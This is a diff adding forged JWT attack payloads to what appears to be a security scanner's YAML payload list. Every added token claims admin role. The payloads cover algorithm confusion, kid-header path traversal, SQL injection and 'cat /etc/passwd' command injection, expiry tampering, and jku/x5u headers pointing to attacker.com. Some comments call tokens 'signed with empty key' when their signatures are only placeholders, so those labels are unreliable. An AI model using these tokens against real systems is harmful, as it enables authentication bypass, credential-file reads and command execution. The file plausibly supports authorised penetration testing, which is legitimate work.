@@ -46,6 +46,44 @@ payloads:
   # Weak secret: 'jwt' — real HMAC-SHA256 signature
   - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.miFXQHX5yq4FHKNT7z43rBQN08A-MiShbrQwBQhvgfc"
   
+  # Algorithm confusion: RS256→HS256 with dummy signature (requires runtime generation with server's public key)
+  # This token has structurally-valid base64url but placeholder signature to pass parsing
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Algorithm confusion: RS256→HS384 variant
+  - "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Algorithm confusion: RS256→HS512 variant
+  - "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: path traversal to /dev/null — signed with empty key
+  - "eyJhbGciOiAiSFMyNTYiLCAia2lkIjogIi4uLy4uL2Rldi9udWxsIiwgInR5cCI6ICJKV1QifQ.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDE5MTYyMzkwMjIsICJyb2xlIjogImFkbWluIn0.UdPZsMEUouirVq0HOzKE7a-HrVcxW8HwS9js5AHeoF4"
+  
+  # kid header injection: SQL injection payload — signed with empty key  
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMycgT1IgJzEnPScxJy0tIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: command injection — signed with empty key
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTsgY2F0IC9ldGMvcGFzc3dkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # kid header injection: null byte (%00 instead of %p0) — signed with empty key
+  - "eyJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEyMyUwMCIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Expiry manipulation: exp set to year 2100 (4102444800) — signed with empty key
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgImV4cCI6IDQxMDI0NDQ4MDAsICJyb2xlIjogImFkbWluIn0.EpMCLQtk0xm9JZiUaBcR5YCDCYosfS8PFeKD3q7K0Pc"
+  
+  # Expiry manipulation: exp field removed entirely — signed with empty key
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTUxNjIzOTAyMiwgInJvbGUiOiAiYWRtaW4ifQ.9PvMCXF9eXdS-e4hdfMupLKSG_kdJVt20Tj7Z_Txw2I"
+  
+  # Expiry manipulation: negative exp value
+  - "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjotMSwicm9sZSI6ImFkbWluIn0.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Header injection: jku pointing to attacker JWKS endpoint (requires live endpoint)
+  # Dummy signature - real attack needs valid RSA signature from attacker's key
+  - "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vLndlbGwta25vd24vandrcy5qc29uIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
+  # Header injection: x5u pointing to attacker certificate (requires live endpoint)
+  - "eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vY2VydC5wZW0iLCJ0eXAiOiJKV1QifQ.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjoxOTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+  
 
 # Indicators that suggest successful JWT attack
 success_indicators:
